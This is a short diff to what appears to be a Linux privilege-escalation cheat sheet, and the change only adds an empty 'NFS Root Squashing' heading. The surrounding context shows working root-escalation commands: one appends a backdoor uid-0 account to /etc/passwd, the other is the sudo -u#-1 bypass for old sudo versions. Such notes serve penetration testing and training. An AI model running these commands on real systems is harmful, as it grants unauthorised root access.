@@ -106,6 +106,8 @@ ls -la /etc/passwd
 echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
 ```
 
+### NFS Root Squashing
+
 ### sudo < v1.28 - @sickrov [PrivEsc]
 ```
 sudo -u#-1 /bin/bash
